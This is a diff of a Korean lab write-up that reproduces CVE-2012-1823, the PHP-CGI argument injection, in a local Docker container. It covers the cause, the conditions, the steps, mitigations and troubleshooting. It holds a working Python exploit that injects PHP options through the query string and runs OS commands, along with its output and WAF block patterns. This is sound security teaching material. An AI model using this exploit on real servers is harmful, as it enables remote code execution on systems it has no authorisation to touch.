@@ -1,126 +1,408 @@
-# Korean Vulhub (한글판)
+# CVE-2012-1823 (PHP-CGI Argument Injection) 취약점 분석 및 재현
 
-![logo](./README.assets/logo.svg)
+## 1. 취약점 개요
 
-취약한 도커 환경을 구축하여, 이해도를 높이고, 실습을 통해 보안 기술을 익히는 것을 목표로 합니다.
+### CVE 정보
 
-[Vulhub](https://github.com/vulhub/vulhub) (<https://vulhub.org/>) 을 참고하여, 다양한 컨테이너 기반의 취약한 환경을 구축합니다.
+* **CVE ID**: CVE-2012-1823
+* **취약점 유형**: Argument Injection → Remote Code Execution (RCE)
+* **영향 제품**: PHP-CGI
 
-<br/>
 
-### Table of Contents
+### 취약점 설명
 
-- **ActiveMQ** — Java 기반 오픈소스 메시지 브로커
-    - [CVE-2016-3088](./ActiveMQ/CVE-2016-3088/README.md) — ActiveMQ fileserver 임의 파일 쓰기 → RCE
-        - Contributor: [@Roronoawjd](https://github.com/Roronoawjd) | Risk Score: 9.8 (Reproducibility: 75%)
+CVE-2012-1823은 PHP-CGI 환경에서 발생하는 원격 코드 실행 취약점이다. PHP-CGI가 URL의 Query String을 처리하는 과정에서 특정 조건의 입력을 명령행 인자로 잘못 해석하는 문제가 존재한다.
 
-- **CouchDB** — Erlang 기반 오픈소스 문서 지향 NoSQL 데이터베이스
-    - [CVE-2017-12635](./CouchDB/CVE-2017-12635/README.md) — CouchDB JSON 파서 불일치를 이용한 원격 권한 상승
-        - Contributor: [@jason1343](https://github.com/jason1343) | Risk Score: 9.8 (Reproducibility: 70%)
+공격자는 이 동작을 악용하여 PHP 실행 옵션을 임의로 주입할 수 있으며, 결과적으로 서버에서 원하는 PHP 코드를 실행하거나 운영체제 명령을 수행할 수 있다.
 
-- **Django** — Python 기반 웹 프레임워크
-    - [CVE-2021-35042](./Django/CVE-2021-35042/README.md) — QuerySet.order_by() SQL Injection
-        - Contributor: [@sj1226m](https://github.com/sj1226m) | Risk Score: 7.5 (Reproducibility: 70%)
-    - [CVE-2022-34265](./Django/CVE-2022-34265/README.ko-kr.md) — Trunc()/Extract() SQL Injection
-        - Contributor: [@woohyun212](https://github.com/woohyun212) | Risk Score: 9.8 (Reproducibility: 85%)
-    - [CVE-2022-34265 (2)](./Django/CVE-2022-34265_2/README.md) — Trunc()/Extract() SQL Injection
-        - Contributor: [@KMINGON](https://github.com/KMINGON) | Risk Score: 9.8 (Reproducibility: 80%)
+### 발생 원인
 
-- **Express** — Node.js 웹 프레임워크
-    - [CVE-2024-29041](./Express/CVE-2024-29041/README.md) — Express 오픈 리다이렉트 취약점
-        - Contributor: [@j93es](https://github.com/j93es) | Risk Score: 6.1 (Reproducibility: 75%)
+PHP-CGI는 일반적으로 웹 서버로부터 전달받은 요청을 처리한다. 그러나 Query String에 `=` 문자가 존재하지 않는 경우 일부 문자열을 명령행 옵션으로 인식하는 결함이 존재하였다.
 
-- **Elfinder** — PHP 기반 웹 파일 관리자
-    - [CVE-2021-32682](./Elfinder/CVE-2021-32682/README.md) — ZIP 인수 삽입을 통한 원격 코드 실행
-        - Contributor: [@Tjdmin1](https://github.com/Tjdmin1) | Risk Score: 9.8 (Reproducibility: 75%)
+예를 들어 다음과 같은 요청이 전달될 경우:
 
-- **Flask** — Python 경량 웹 프레임워크
-    - [SSTI](./Flask/SSTI/README.md) — Server Side Template Injection
-        - Contributor: [@positiveWand](https://github.com/positiveWand) | Risk Score: 9.0 (Reproducibility: 75%)
+```text
+/index.php?-s
+```
 
-- **Gradio** — Python 기반 ML 모델 웹 인터페이스 라이브러리
-    - [CVE-2023-51449](./Gradio/CVE-2023-51449/README.md) — /file 엔드포인트 디렉터리 트래버설
-        - Contributor: [@annseojin](https://github.com/annseojin) | Risk Score: 7.5 (Reproducibility: 80%)
+PHP-CGI는 `-s`를 URL 파라미터가 아닌 PHP 실행 옵션으로 해석한다.
 
-- **GeoServer** — Java 기반 오픈소스 공간 데이터 서버
-    - [CVE-2023-25157](./GeoServer/CVE-2023-25157/README.md) — GeoServer OGC 필터 SQL 인젝션
-        - Contributor: [@djadydwls0720](https://github.com/djadydwls0720) | Risk Score: 9.8 (Reproducibility: 65%)
-    - [CVE-2023-25157 (2)](./GeoServer/CVE-2023-25157_2/README.md) — GeoServer OGC 필터 SQL 인젝션
-        - Contributor: [@moooooji](https://github.com/moooooji) | Risk Score: 9.8 (Reproducibility: 60%)
+공격자는 이러한 특성을 이용하여 `-d` 옵션을 주입하고 PHP 설정을 런타임에 변경하여 악성 코드를 실행할 수 있다.
 
-- **HugeGraph** — Apache 기반 오픈소스 그래프 데이터베이스
-    - [CVE-2024-43441](./HugeGraph/CVE-2024-43441/README.md) — JWT 비밀 키 하드코딩으로 인한 인증 우회
-        - Contributor: [@HanTul](https://github.com/HanTul) | Risk Score: 9.8 (Reproducibility: 85%)
+### 영향
 
-- **Librsvg** — GNOME SVG 렌더링 라이브러리
-    - [CVE-2023-38633](./Librsvg/CVE-2023-38633/README.md) — librsvg xi:include 디렉터리 탐색 파일 읽기
-        - Contributor: [@EL55](https://github.com/EL55) | Risk Score: 7.5 (Reproducibility: 80%)
+취약한 서버는 원격 공격자의 요청만으로 임의 코드 실행이 가능하다.
 
-- **Libssh** — SSHv2 프로토콜 C 라이브러리
-    - [CVE-2018-10933](./Libssh/CVE-2018-10933/README.md) — libssh 서버 state machine 인증 우회
-        - Contributor: [@hhtboy](https://github.com/hhtboy) | Risk Score: 9.8 (Reproducibility: 75%)
+성공 시 공격자는 웹 서버 권한으로 다음과 같은 행위를 수행할 수 있다.
 
-- **MongoExpress** — MongoDB 웹 기반 관리 인터페이스
-    - [CVE-2019-10758](./MongoExpress/CVE-2019-10758/README.md) — mongo-express 원격 코드 실행
-        - Contributor: [@ilohas0021](https://github.com/ilohas0021) | Risk Score: 9.8 (Reproducibility: 80%)
+* 시스템 명령 실행
+* 웹 쉘 업로드
+* 중요 파일 열람
+* 추가 공격을 위한 권한 확장 시도
 
-- **MySQL** — 관계형 데이터베이스
-    - [CVE-2012-2122](./MySQL/CVE-2012-2122/README.md) — MySQL Authentication Bypass
-        - Contributor: [@baethwjd2](https://github.com/baethwjd2) | Risk Score: 7.0 (Reproducibility: 70%)
+---
 
-- **Next.js** — React 기반 풀스택 웹 프레임워크
-    - [CVE-2025-29927](./Next.js/CVE-2025-29927/README.md) — Next.js 미들웨어 인가 우회
-        - Contributor: [@idealinsane](https://github.com/idealinsane) | Risk Score: 9.1 (Reproducibility: 85%)
+# 2. 실습 환경 구성
 
-- **Nginx** — 고성능 웹 서버 / 리버스 프록시
-    - [CVE-2017-7529](./Nginx/CVE-2017-7529/README.md) — Nginx Integer Overflow Vulnerability
-        - Contributor: [@c0dep1ayer](https://github.com/c0dep1ayer) | Risk Score: 7.5 (Reproducibility: 75%)
+본 실습은 Docker를 이용하여 취약한 PHP-CGI 환경을 로컬에 구축한 후 진행하였다.
 
-- **Node** — JavaScript 런타임 환경
-    - [CVE-2017-14849](./Node/CVE-2017-14849/README.md) — Node.js path.normalize() 디렉터리 탐색 취약점
-        - Contributor: [@ssongk](https://github.com/ssongk) | Risk Score: 7.5 (Reproducibility: 75%)
-    - [CVE-2017-14849 (2)](./Node/CVE-2017-14849_2/README.md) — Node.js path.normalize() 디렉터리 탐색 취약점
-        - Contributor: [@junwonheo](https://github.com/junwonheo) | Risk Score: 7.5 (Reproducibility: 65%)
+## Docker Compose 설정
 
-- **PHP** — 서버 사이드 스크립트 언어
-    - [CVE-2012-1823](./PHP/CVE-2012-1823/README.md) — php-cgi 인자 주입을 통한 원격 코드 실행
-        - Contributor: [@kty121](https://github.com/kty121) | Risk Score: 9.8 (Reproducibility: 80%)
+### docker-compose.yml
 
-- **Python** — Python 런타임 환경
-    - [CVE-2017-8291](./Python/CVE-2017-8291/README.md) — PIL(Pillow) GhostScript EPS 처리 RCE
-        - Contributor: [@wjdgnsdl213](https://github.com/wjdgnsdl213) | Risk Score: 9.8 (Reproducibility: 75%)
+```yaml
+services:
+  php:
+    image: vulhub/php:5.4.1-cgi
+    ports:
+      - "8081:80"
+```
 
-- **Redis** — 인메모리 키-값 데이터베이스
-    - [CVE-2022-0543](./Redis/CVE-2022-0543/README.md) — Lua 샌드박스 탈출을 통한 원격 코드 실행
-        - Contributor: [@yeo0n](https://github.com/yeo0n) | Risk Score: 10.0 (Reproducibility: 65%)
+포트 충돌을 방지하기 위해 호스트의 8081 포트를 사용하였다.
 
-- **Spring** — Java 엔터프라이즈 웹 프레임워크
-    - [CVE-2022-22963](./Spring/CVE-2022-22963/README.md) — Spring Cloud Function SpEL 코드 주입
-        - Contributor: [@foskingson](https://github.com/foskingson) | Risk Score: 9.8 (Reproducibility: 75%)
-    - [CVE-2022-22965](./Spring/CVE-2022-22965/README.md) — Spring Framework RCE via Data Binding (Spring4Shell)
-        - Contributor: [@ddddabi](https://github.com/ddddabi) | Risk Score: 9.8 (Reproducibility: 70%)
-    - [CVE-2022-22978](./Spring/CVE-2022-22978/README.md) — Spring Security Authorization Bypass in RegexRequestMatcher
-        - Contributor: [@sub0810](https://github.com/sub0810) | Risk Score: 9.8 (Reproducibility: 80%)
+## 환경 구축 절차
 
-- **Struts2** — Java 기반 MVC 웹 프레임워크
-    - [CVE-2018-11776](./Struts2/CVE-2018-11776/README.md) — Struts2 S2-057 URL 매핑 OGNL 표현식 주입 RCE
-        - Contributor: [@ye11oc4t](https://github.com/ye11oc4t) | Risk Score: 8.1 (Reproducibility: 80%)
-    - [CVE-2019-0230](./Struts2/CVE-2019-0230/README.md) — Struts2 S2-059 OGNL 표현식 주입 RCE
-        - Contributor: [@hy30nq](https://github.com/hy30nq) | Risk Score: 9.8 (Reproducibility: 80%)
+### 1) 작업 디렉터리 생성
 
-- **Tiki Wiki** — PHP 기반 오픈소스 CMS / Wiki
-    - [CVE-2020-15906](./TikiWiki/CVE-2020-15906/README.md) — TikiWiki CMS Authentication Bypass → RCE
-        - Contributor: [@haijun9](https://github.com/haijun9) | Risk Score: 8.8 (Reproducibility: 60%)
+```powershell
+mkdir CVE-2012-1823-test
+cd CVE-2012-1823-test
+```
 
-- **Tomcat** — Java 기반 오픈소스 웹 애플리케이션 서버
-    - [CVE-2020-1938](./Tomcat/CVE-2020-1938/README.md) — Apache Tomcat AJP 파일 읽기 (Ghostcat)
-        - Contributor: [@mythofsummer](https://github.com/mythofsummer) | Risk Score: 9.8 (Reproducibility: 70%)
+### 2) docker-compose.yml 생성
 
-<br/>
+```powershell
+Set-Content -Path .\docker-compose.yml -Value @"
+services:
+  php:
+    image: vulhub/php:5.4.1-cgi
+    ports:
+      - "8081:80"
+"@
+```
 
-### Report Evaluation
+### 3) 컨테이너 실행
 
-각 보고서는 취약점 자체의 위험도와 Report Reliability를 분리해 평가합니다. Docker 환경과 제출된 PoC를 재검증한 뒤 기록합니다.
+```powershell
+docker-compose up -d
+```
 
-- Reproducibility: 제출된 환경과 PoC를 그대로 따랐을 때 재현 가능한 정도를 0%에서 100%로 표현합니다. 환경 구성, 취약 조건, 재현 절차, PoC 코드, 실행 결과, 대응 방안의 명확성을 기준으로 평가합니다.
-- Risk Score: 인증 필요 여부, 원격 악용 가능성, 영향 범위, PoC 및 Docker 환경에서 확인되는 실제 동작을 기준으로 CVSS처럼 0.0에서 10.0 사이로 평가합니다.
+### 4) 테스트용 PHP 파일 생성
+
+```powershell
+docker-compose exec php sh -c "echo '<?php // empty' > /var/www/html/index.php"
+```
+
+실습 대상 환경에는 PHP 파일이 존재해야 PHP-CGI가 정상적으로 동작한다.
+
+---
+
+# 3. 취약 조건
+
+CVE-2012-1823이 발생하기 위해서는 다음 조건이 충족되어야 한다.
+
+## PHP-CGI 사용
+
+PHP가 Apache Module(mod_php) 방식이 아닌 PHP-CGI 방식으로 실행되어야 한다.
+
+## PHP 파일 존재
+
+서버 내에 최소 하나 이상의 PHP 파일이 존재해야 한다.
+
+예시:
+
+```text
+index.php
+test.php
+info.php
+```
+
+## 특수 Query String 사용
+
+요청 URL에 `=` 문자가 없는 형태의 Query String이 포함되어야 한다.
+
+예시:
+
+```text
+?-s
+?-d
+```
+
+이 경우 PHP-CGI가 이를 명령행 인자로 해석할 수 있다.
+
+---
+
+# 4. 취약점 재현 과정
+
+## 1단계: 서비스 확인
+
+브라우저에서 다음 주소에 접속한다.
+
+```text
+http://localhost:8081/index.php
+```
+
+정상적으로 응답이 반환되는지 확인한다.
+
+## 2단계: Argument Injection 확인
+
+다음 URL에 접속한다.
+
+```text
+http://localhost:8081/index.php?-s
+```
+
+### 정상 환경
+
+```text
+빈 페이지 출력
+```
+
+### 취약 환경
+
+PHP 소스 코드가 하이라이팅되어 출력된다.
+
+이는 `-s` 옵션이 성공적으로 주입되었음을 의미한다.
+
+---
+
+## 3단계: PHP 설정 변경
+
+다음 두 개의 옵션을 이용한다.
+
+### allow_url_include
+
+```text
+allow_url_include=on
+```
+
+외부 URL 또는 스트림을 include 가능하도록 설정한다.
+
+### auto_prepend_file
+
+```text
+auto_prepend_file=php://input
+```
+
+POST Body에 포함된 PHP 코드를 먼저 실행하도록 설정한다.
+
+---
+
+## 4단계: PoC 실행
+
+POST Body에 PHP 코드를 삽입하여 서버에서 직접 실행시킨다.
+
+---
+
+# 5. Proof of Concept
+
+## exploit.py
+
+```python
+import requests
+
+url = "http://localhost:8081/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a%2f%2finput"
+
+payload = "<?php system('id; uname -a'); die(); ?>"
+
+try:
+    print("[*] Sending exploit...")
+
+    response = requests.post(
+        url,
+        data=payload,
+        timeout=5
+    )
+
+    print("\n[+] Execution Result:")
+    print(response.text)
+
+except Exception as e:
+    print(f"[-] Exploit failed: {e}")
+```
+
+해당 코드는 POST 요청을 통해 PHP 코드를 전달하고, 서버에서 운영체제 명령을 실행한 뒤 결과를 반환받는다.
+
+---
+
+# 6. 실행 결과 및 분석
+
+## 실행 결과
+
+```text
+[*] Sending exploit...
+
+[+] Execution Result:
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Linux 4231e4e90a87 6.18.33.2-microsoft-standard-WSL2
+#1 SMP PREEMPT_DYNAMIC Thu Jun 18 21:54:43 UTC 2026
+x86_64 GNU/Linux
+```
+
+## 결과 분석
+
+실행 결과를 통해 다음 사실을 확인할 수 있다.
+
+```text
+uid=33(www-data)
+```
+
+이는 명령어가 웹 서버 프로세스 권한으로 실행되었음을 의미한다.
+
+비록 root 권한은 아니지만 다음과 같은 행위가 가능하다.
+
+* 웹 애플리케이션 파일 접근
+* 서버 정보 수집
+* 데이터 유출 시도
+* 웹 쉘 업로드
+* 추가 권한 상승 공격 준비
+
+따라서 본 취약점은 실제 환경에서도 매우 높은 위험도를 가진다.
+
+---
+
+# 7. 대응 방안
+
+## 1) PHP 버전 업그레이드
+
+가장 효과적인 대응 방법은 패치가 적용된 버전으로 업그레이드하는 것이다.
+
+패치 버전:
+
+* PHP 5.3.12 이상
+* PHP 5.4.2 이상
+
+패치 이후에는 `-` 로 시작하는 비정상 입력이 적절히 필터링된다.
+
+---
+
+## 2) PHP-FPM 사용
+
+PHP-CGI 대신 PHP-FPM을 사용하는 것이 권장된다.
+
+장점:
+
+* 보안성 향상
+* 성능 향상
+* 유지보수 용이
+
+---
+
+## 3) 웹 서버 필터링
+
+웹 서버 또는 WAF에서 다음 패턴을 차단한다.
+
+```text
+?-d
+?-s
+```
+
+또는 Query String이 `-`로 시작하는 요청 자체를 차단한다.
+
+---
+
+## 4) 보안 장비 활용
+
+다음과 같은 보안 솔루션을 적용할 수 있다.
+
+* WAF(Web Application Firewall)
+* ModSecurity
+* Reverse Proxy Filtering
+
+이를 통해 알려진 공격 패턴을 사전에 차단할 수 있다.
+
+---
+
+# 8. 실습 과정에서 발생한 문제 및 해결
+
+## 포트 충돌
+
+### 문제
+
+초기 설정에서 8080 포트를 사용하려 했으나 이전에 과제 수행 중에 시도했던 다른 서비스가 점유 중이었다.
+
+```text
+Port is already allocated
+```
+
+### 해결
+
+Docker Compose 설정을 수정하여 8081 포트를 사용하였다.
+
+---
+
+## Python 라이브러리 인식 오류
+
+### 문제
+
+여러 Python 버전이 설치되어 있어 requests 라이브러리가 설치된 환경과 실제 실행 환경이 달랐다.
+
+```text
+ModuleNotFoundError
+```
+
+### 해결
+
+라이브러리가 설치된 Python 인터프리터의 절대 경로를 직접 지정하여 실행하였다.
+
+```powershell
+C:\Users\user\...\python.exe exploit.py
+```
+
+---
+
+## 인코딩 문제
+
+### 문제
+
+PowerShell에서 생성한 파일이 UTF-8이 아닌 인코딩으로 저장되어 오류가 발생하였다.
+
+```text
+SyntaxError: Non-UTF-8 code
+```
+
+### 해결
+
+파일 생성 시 UTF-8 인코딩을 명시하였다.
+
+```powershell
+-Encoding UTF8
+```
+
+---
+
+## PHP 파일 부재
+
+### 문제
+
+Docker 이미지 내부에 실행 가능한 PHP 파일이 존재하지 않아 공격이 실패하였다.
+
+```text
+404 Not Found
+```
+
+또는 Apache 기본 페이지가 출력되었다.
+
+### 해결
+
+컨테이너 내부에 빈 PHP 파일을 생성하였다.
+
+```powershell
+docker-compose exec php sh -c "echo '<?php // empty' > /var/www/html/index.php"
+```
+
+이후 PHP-CGI가 정상적으로 동작하며 취약점 재현에 성공하였다.
+
+---
+
+# 9. 결론
+
+CVE-2012-1823은 PHP-CGI의 Query String 처리 과정에서 발생하는 대표적인 Argument Injection 취약점이다.
+
+실습에서 Docker 환경에서 취약한 PHP 5.4.1-CGI 버전을 구성하고, Query String을 이용한 옵션 주입을 통해 원격 코드 실행이 가능함을 확인하였다. 또한 PoC를 통해 웹 서버 권한으로 운영체제 명령이 수행되는 것을 검증하였다.
+
+실습을 통해 웹 애플리케이션의 실행 구조와 CGI 방식의 동작 원리를 이해할 수 있었으며, 단순한 입력 검증 실패가 얼마나 심각한 보안 문제로 이어질 수 있는지 확인할 수 있었다. 최신 버전 유지와 안전한 실행 환경 구성의 중요성을 다시 한번 확인할 수 있는 사례였다.
+
+![alt text](image.png)
